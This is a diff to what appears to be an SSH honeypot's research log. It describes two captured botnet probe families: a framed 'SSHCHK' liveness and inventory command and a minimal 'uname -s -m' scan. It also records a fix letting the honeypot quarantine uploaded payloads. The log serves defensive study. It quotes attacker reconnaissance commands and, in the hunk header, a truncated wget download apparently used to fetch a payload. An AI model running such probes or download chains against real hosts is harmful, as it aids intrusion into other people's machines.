@@ -608,3 +608,63 @@ uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; (wget --no-check-certifica
 **Rejected:**
 
 - hardcoding 1 -- wanted the option to go back without a code change
+
+---
+
+### new families: SSHCHK + minimal OS scanner (2026-05-30, Rabat)
+
+**93.5h total. 3297 attempts, 180 IPs, 880 commands.**
+
+**Family 8 -- SSHCHK liveness checker (02:20 and 02:23 UTC, 2 sessions)**
+
+Full command:
+```
+echo SSHCHK_5718926f9304_BEGIN; uname -srm; echo $((7*191+3)); hostname; df -P / 2>/dev/null | awk 'NR==2{print $1}'; echo SSHCHK_5718926f9304_END
+```
+
+Most sophisticated C2 interaction seen so far. Four components:
+
+- SSHCHK_<token>_BEGIN / _END: structured framing. C2 extracts everything between these
+  markers. Unique hex token per session -- prevents replay attacks and correlates output
+  to this specific connection.
+- uname -srm: OS name + release + arch in one call
+- echo $((7*191+3)) = 1340: arithmetic proof-of-work. Shell must evaluate the expression.
+  A static replay or a broken shell returns something else. Confirms live interactive shell.
+- df -P / | awk 'NR==2{print $1}': root filesystem device name (/dev/sda1 etc). Disk check.
+
+Two sessions, different IPs (SSH-2.0-Go), 3 minutes apart. Same tool, different botnet nodes.
+No follow-up commands -- the C2 reads the output and decides what to do next (externally).
+This is a pure inventory/assessment probe. The most careful liveness check in the dataset.
+
+**Family 9 -- Minimal OS scanner (06:03 and 07:39 UTC, 2 sessions)**
+
+Command: uname -s -m (just that, nothing else)
+Clients: SSH-2.0-Go, different IPs, 1h36m apart.
+
+Returns "Linux x86_64". Bot disconnects immediately after. Pure OS/arch check -- if not
+Linux x86_64, the bot never sends a payload. Lightest possible post-auth probe.
+Could be a first-stage probe before a payload bot follows up, or a cataloguing scanner.
+
+---
+
+### SCP fix + quarantine uncertainty (2026-05-30)
+
+**Fixed: interactive shell SCP path now sends the \x00 ready byte.**
+
+Before: scpCmd.Run() returned ("", 0) without speaking the wire protocol. The attacker's
+scp client was waiting for \x00, got nothing, timed out. Upload impossible by design.
+
+After: runShell detects isSCPReceive before dispatch and hands the channel to runSCPReceive
+which speaks the full wire protocol. Required adding quarantineDir param to runShell.
+
+**Will quarantine capture real payloads now? Uncertain.**
+
+Depends on how the attacker bot is implemented:
+- If the bot is SCP-aware (expects \x00 and sends file headers on the same connection):
+  yes, payload lands in quarantine.
+- If the bot is a dumb script (just types commands at a shell, doesn't switch to SCP mode
+  after seeing \x00): it sees the byte as terminal output and moves on. Nothing uploaded.
+
+The exec channel path (dropper_sim.go) is guaranteed to work -- the SCP client on the
+other end is explicitly in SCP mode. Interactive shell path depends on the attacker's
+implementation. Will know after next deploy when SCP dropper hits again.
